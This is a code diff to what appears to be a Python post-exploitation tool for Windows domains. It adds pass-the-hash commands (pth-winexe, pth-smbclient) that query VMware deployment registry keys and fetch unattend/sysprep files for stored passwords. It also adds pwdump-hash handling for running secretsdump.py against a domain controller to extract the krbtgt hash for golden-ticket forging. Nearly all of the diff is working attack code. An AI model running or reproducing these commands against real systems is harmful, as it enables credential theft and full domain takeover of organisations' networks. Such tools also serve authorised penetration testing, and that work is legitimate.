@@ -976,7 +976,38 @@ def datadump(user, passw, host, path, os_version):
 			if unattend in yesanswers:
 				
 				try:
-					print colored("[+]Attempting to Find Unattend/Sysprep Files",'green')
+					
+					#Check for 64 Bit Version Values of VMWare DeployData
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					deploydata=proc.communicate()[0]
+					deploydata=deploydata[108:].rstrip()
+					
+					deploydata=str(bytearray.fromhex(deploydata))
+					
+					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
+						print colored("\n[+]VMware Specific ",'green')
+						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
+						print colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow')
+						print colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow')
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						print proc.communicate()[0]
+					
+					#Check for 32 Bit Version Values of VMWare DeployData
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					deploydata=proc.communicate()[0]
+					deploydata=deploydata[108:].rstrip()
+					
+					deploydata=str(bytearray.fromhex(deploydata))
+					
+					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
+						print colored("\n[+]VMware Specific ",'green')
+						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
+						print colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow')
+						print colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow')
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						print proc.communicate()[0]
+
+					print colored("\n[+]Attempting to Find Unattend/Sysprep Files",'green')
 					
 					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.inf\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory sysprep -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
@@ -985,7 +1016,7 @@ def datadump(user, passw, host, path, os_version):
 					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther/unattend -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)		
 
 					if os.path.isfile(outputpath+host+"/unattend.xml"):
-						print colored("[+]unattend.xml file found, grepping for username, password, group",'green')
+						print colored("[+]" +outputpath+host+"/unattend.xml file found, grepping for username, password, group",'green')
 						
 						os.chdir(outputpath+host)
 												
@@ -1208,8 +1239,6 @@ def run():
 						os.system("rdesktop "+host+" 2>/dev/null")
 			else:
 				print colored(e,'red')
-
-
 
 def hashparse(hashfolder,hashfile):
 #Split hashes into NT and LM	
@@ -1516,7 +1545,6 @@ p.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey",
 p.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
 p.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")
 
-
 args = p.parse_args()
 
 user = args.username
@@ -1682,7 +1710,13 @@ if recorddesktop in yesanswers:
 if golden_ticket in yesanswers:
 	if len(targets)==1:
 		try:
-						
+			#Check to see whether the supplied password is a hash or not
+			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+			pwdump = pwdumpmatch.match(passw)
+			
+			if pwdump:
+				passw=passw[0:-3]
+			
 			if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
 				print colored("[+]Found file - completed : "+outputpath+targets[0]+"/nt.txt",'green')
 				print colored("[+]Taking krbtgt hash from pre parsed hashes",'yellow')
@@ -1702,7 +1736,14 @@ if golden_ticket in yesanswers:
 			else:
 				print colored("[+]Pre parsed hashes not found : "+outputpath+targets[0]+"/nt.txt",'green')
 				print colored("[+]Connecting to DC to get krbtgt hash : ",'yellow')
-				proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
+				
+				if pwdump:
+					#os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+					proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
+				else:
+					proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
+							
+
 				stdout_value = proc.communicate()[0]
 				krbtgt_data=stdout_value.splitlines()
 				for hash_line in krbtgt_data:
@@ -1715,7 +1756,11 @@ if golden_ticket in yesanswers:
 			
 			if len(kNTHASH)>0:
 				#Get the SID Information
+				
+
 				proc = subprocess.Popen("pth-rpcclient -U "+user+"%"+passw+" "+ targets[0]+" -c \"lookupnames krbtgt\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				
+
 				stdout_value = proc.communicate()[0]
 					
 				if not "krbtgt" in stdout_value:
